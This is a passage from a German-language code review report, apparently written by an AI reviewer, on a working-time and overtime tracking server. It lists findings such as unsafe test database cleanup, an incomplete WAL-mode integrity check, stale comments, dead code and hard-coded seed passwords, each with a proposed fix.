nachzurechnen. Mittelfristig die Client-Kopie entfernen — sie ist die dreizehnte Kopie
derselben Regel, deren Konsolidierung Phase 9 begonnen hat.

### WR-13: Der Unversehrtheitsnachweis in `verifyPeriodNullEffect` trägt unter WAL nicht

**Datei:** `server/src/scripts/verifyPeriodNullEffect.ts:283-286`, `379-383`, `354-356`
**Issue:** Zwei Schwächen im Nachweiswerkzeug:

1. Der SHA-256-Vergleich läuft über die **Hauptdatei**. Die geteilte Verbindung schaltet
   `journal_mode = WAL` — Schreibvorgänge landen zunächst in `-wal`, die Hauptdatei bleibt
   bis zum Checkpoint byteweise identisch. Der Lauf kann also „Unversehrtheit: ja" melden,
   obwohl geschrieben wurde. Der Nachweis ist damit schwächer, als er behauptet.
2. `getDailyTargetHours()` in Zeile 354 kann `MissingWorkPeriodError` werfen. Der Fehler
   läuft ungefangen bis in `main().catch()` und beendet den gesamten Lauf mit „FATAL". Statt
   einer Liste der betroffenen Nutzer bekommt man einen Abbruch beim ersten — für ein
   Werkzeug, das den Bestand *prüfen* soll, die falsche Reaktion.

**Fix:** (1) Vor dem Hashen `db.pragma('wal_checkpoint(TRUNCATE)')` ausführen oder die
Verbindung `readonly: true` öffnen und die Größe/den Hash von `-wal` und `-shm` mitprüfen.
(2) Den Fehler je Nutzer fangen und als eigene Ergebniskategorie („Periode fehlt") ausweisen,
statt abzubrechen.

### WR-14: Tests schreiben in die Arbeitsdatenbank — hart löschend, ohne Produktionsschutz

**Datei:** `server/src/services/workPeriodContext.test.ts:26-37`, `server/src/services/absencePeriodAwareness.test.ts:31-51`, `server/src/services/overtimeTransactionRebuildService.test.ts:124-143`, `server/vitest.config.ts`
**Issue:** Die neuen Testdateien legen echte Nutzer per `INSERT INTO users` an und räumen
per `DELETE FROM users`/`DELETE FROM overtime_transactions` wieder auf — in derselben
Datenbank, die `getDatabasePath()` liefert. `vitest.config.ts` dokumentiert das als bekannt
(„alle Tests arbeiten auf derselben `database/development.db`"), aber keine Testdatei ruft
`assertNotProduction()`. Ein `npm test` mit gesetztem `DATABASE_PATH` — genau die
Aufrufform, die `.claude/CLAUDE.md` für jedes Skript vorschreibt — löscht Zeilen in der
angegebenen Datenbank. Der Guard existiert bereits (`scripts/productionGuard.ts`), wird hier
nur nicht benutzt.

Zusätzlich vergibt `createT1105User()` (`overtimeTransactionRebuildService.test.ts:126`)
einen **festen** Benutzernamen `t1105-${suffix}` ohne Zufallsanteil — anders als die anderen
Testdateien. Nach einem abgebrochenen Lauf scheitert der nächste an der
`UNIQUE`-Bedingung, und der Aufräumnachweis am Dateiende schlägt fehl.

**Fix:** Eine `vitest.setup.ts` mit `assertNotProduction()` als `setupFiles` eintragen und
`createT1105User()` denselben `Math.random().toString(36).slice(2, 8)`-Suffix geben wie
`createT1107User()`.

### WR-15: Kopfkommentare beschreiben den Stand vor Phase 11 als gültig

**Datei:** `server/src/services/workPeriodContext.ts:22-23`, `server/src/services/workPeriodService.ts:42-44`
**Issue:** Zwei Aussagen sind seit diesem Umbau falsch:

- `workPeriodContext.ts:22-23`: „Dieser Plan ändert kein Verhalten: nach ihm ruft weiterhin
  niemand diesen Kontext auf." — Es rufen jetzt sieben Services und fünf Skripte auf.
- `workPeriodService.ts:42-44`: „KEIN AUFRUFER IN PHASE 10 (D4, REQ-21) … 
  `users.weeklyHours`/`users.workSchedule` bleiben bis Phase 11 die gelesene Quelle für die
  Berechnung." — Das ist genau die Regel, die Phase 11 abgelöst hat.

In einem Projekt mit Zero-Hallucination-Policy sind veraltete Kopfkommentare kein
Schönheitsfehler: Sie sind die erste Quelle, die die nächste Untersuchung liest, und sie
führen sie in die Irre.

**Fix:** Beide Absätze auf den Stand nach Phase 11 fortschreiben und die Aufruferliste (oder
den Verweis auf das Phase-9-Inventar) nennen.

### WR-16: Toter Code in `overtimeService.ts` wurde mit neuer Perioden-Verdrahtung versehen

**Datei:** `server/src/services/overtimeService.ts:50-129` (`_calculateAbsenceCreditsForMonth`), `146-199` (`_calculateUnpaidLeaveForMonth`), `230-408` (`ensureAbsenceTransactionsForMonth`), `562-603` (`_updateOvertimeTransactionsForDate`)
**Issue:** Vier Funktionen sind laut den eigenen Kommentaren nachweislich ohne Aufrufer
(„09-INVENTAR-SOLLSTUNDEN.md: kein Aufrufer (toter Code)"). Sie haben in dieser Phase
trotzdem `createWorkPeriodContext()`-Aufrufe und `directWorkPeriodLookup`-Parameter
bekommen. Damit wächst die Menge an Code, die bei jeder künftigen Änderung mitgepflegt und
mitgelesen werden muss, ohne je zu laufen — und `ensureAbsenceTransactionsForMonth()`
enthält zusätzlich 21 `console.log`-Zeilen und einen `recordOvertimeEarned()`-Schreibpfad,
der bei versehentlicher Reaktivierung Buchungen erzeugt.

**Fix:** Löschen. Die Git-Historie ist das Archiv; ein `_`-Präfix ist keins. Falls die
Löschung außerhalb dieser Phase liegt, gehört sie mit Datei- und Zeilenangabe in die
Deferred-Liste statt in eine Kommentarzeile.

---

## Info

### IN-01: Fest verdrahtete Testpasswörter in den Seed-Skripten
**Datei:** `server/src/scripts/seedModelChangeUser.ts:216`, `server/src/scripts/seedTestUsers.ts:243,262,…`, `server/src/scripts/create*TestUser.ts` (`'test123'`)
Alle Skripte sind durch `assertNotProduction()` bzw. eine `DATABASE_PATH`-Pflicht geschützt,
das Risiko ist daher gering. Trotzdem: `'test123'` und `'ModellwechselTest12345!'` stehen im
Repository und erzeugen bei jedem Lauf ein Konto mit bekanntem Passwort. **Fix:** Aus einer
Umgebungsvariablen mit Fallback lesen (`process.env.SEED_PASSWORD ?? crypto.randomUUID()`)
und das erzeugte Passwort nur ausgeben, nicht festschreiben.

### IN-02: `validateOvertimeDetailed` zeigt den Stammdatensatz als maßgeblich an
**Datei:** `server/src/scripts/validateOvertimeDetailed.ts:400-411`, `505-507`
Die Überschrift „INDIVIDUAL WORK SCHEDULE" gibt `user.workSchedule` aus — seit Phase 11 nicht
mehr die Rechengrundlage. Die neue Periodenausgabe (Zeile 418-427) listet dagegen nur
`weeklyHours`, nicht den Wochenplan der Periode. Zeile 505 entscheidet die Notiz
„0h day (workSchedule)" ebenfalls über den Stammdatensatz. **Fix:** Den Wochenplan **je
Periode** ausgeben und den Stammdatensatz-Block entweder streichen oder klar als „nur
Referenz, nicht Rechengrundlage" kennzeichnen.

### IN-03: Test-Fixtures werden von einem Laufzeitskript importiert
**Datei:** `server/src/scripts/validateOvertimeCalculation.ts:70,567`
`stubWorkPeriodContext()` aus `src/test-support/` wird vom Validierungswerkzeug geladen. Die
Begründung im Kommentar ist nachvollziehbar (synthetische Szenario-Nutzer ohne
Datenbankzeile), die Modulgrenze verschwimmt dadurch trotzdem: `test-support` ist von der
Coverage ausgenommen und wird künftig ohne Rücksicht auf Nicht-Test-Aufrufer geändert.
**Fix:** Die Stub-Fabrik nach `src/services/workPeriodContext.ts` ziehen (z. B. als
`inMemoryWorkPeriodContext(periods)`) und `test-support` nur noch die
Datenbank-Fixture (`insertTestWorkPeriod`) überlassen.

### IN-04: `getPublicHolidays()` schluckt Fehler und protokolliert an `pino` vorbei
**Datei:** `server/src/utils/workingDays.ts:322-335`
`catch { console.error(...); return []; }` — eine gescheiterte Feiertagsabfrage führt
stillschweigend zu „keine Feiertage" und damit zu **zu hohen** Sollstunden. Das ist ein
falsches Ergebnis, das wie ein richtiges aussieht. Zusätzlich `console.error` statt `logger`.
**Fix:** `logger.error(...)` und den Fehler weiterwerfen; eine unerreichbare
Feiertagstabelle ist kein Zustand, in dem weitergerechnet werden darf.

### IN-05: Datumsformatierung im Export über `new Date(ISO-String)`
**Datei:** `server/src/services/exportService.ts:106`, `130-131`
`format(new Date(entry.date), 'dd.MM.yyyy')` parst `YYYY-MM-DD` als UTC-Mitternacht und
formatiert in Prozess-Zeitzone. Unter `TZ=Europe/Berlin` korrekt, westlich von UTC einen Tag
zu früh. **Fix:** `formatDate(parseDate(entry.date), 'dd.MM.yyyy')` aus
`utils/timezone.ts` oder direkte Zeichenkettenumstellung ohne `Date`.

### IN-06: Unvollständige Objekte per `as UserPublic` durchgereicht
**Datei:** `server/src/services/overtimeLiveCalculationService.ts:140-145`, `server/src/scripts/verifyPeriodNullEffect.ts:327-345`
`{ id, weeklyHours, workSchedule, hireDate } as UserPublic` unterdrückt die Prüfung, dass
alle Pflichtfelder gesetzt sind. Das funktioniert nur, solange `getDailyTargetHours()`
tatsächlich nur `id` und `hireDate` liest — eine Zusage, die im Kommentar steht, nicht im
Typsystem. **Fix:** Einen engen Parametertyp einführen und die Zusage damit erzwingen:
`type TargetHoursUser = Pick<UserPublic, 'id' | 'hireDate'>;`

### IN-07: `clearUserData()` löscht hart statt weich
**Datei:** `server/src/scripts/seedTestUsers.ts:141-143`
`DELETE FROM time_entries`/`absence_requests` widerspricht der Soft-Delete-Regel. Für ein
Seed-Werkzeug vertretbar, sollte aber ausdrücklich als bewusste Ausnahme im Kopfkommentar
stehen, damit das Muster nicht kopiert wird.

### IN-08: Zwei eigenständige Kopien der Sollstundenregel bleiben bestehen
**Datei:** `server/src/utils/workingDays.ts:183-190`, `222-252`
`calculateAbsenceHoursWithWorkSchedule()` überspringt Samstag und Sonntag **immer**,
`getDailyTargetHours()` liefert für Wochenendstunden im Wochenplan Stunden. Der Kommentar
begründet die Beibehaltung sauber (Nullwirkung D5, heute 0 von 20 Nutzern betroffen) und
verweist auf Phase 14. Der Befund bleibt trotzdem stehen: Sobald ein Nutzer mit
`workSchedule.saturday > 0` angelegt wird, weichen Sollstunden und Abwesenheitsgutschrift
für denselben Tag voneinander ab — ohne Fehlermeldung. **Fix:** Bis zur Zusammenführung eine
Prüfung ergänzen, die beim Anlegen/Ändern einer Periode mit Wochenendstunden warnt.

---

_Geprüft: 2026-08-22_
_Prüfer: Claude (gsd-code-reviewer)_
_Tiefe: standard_
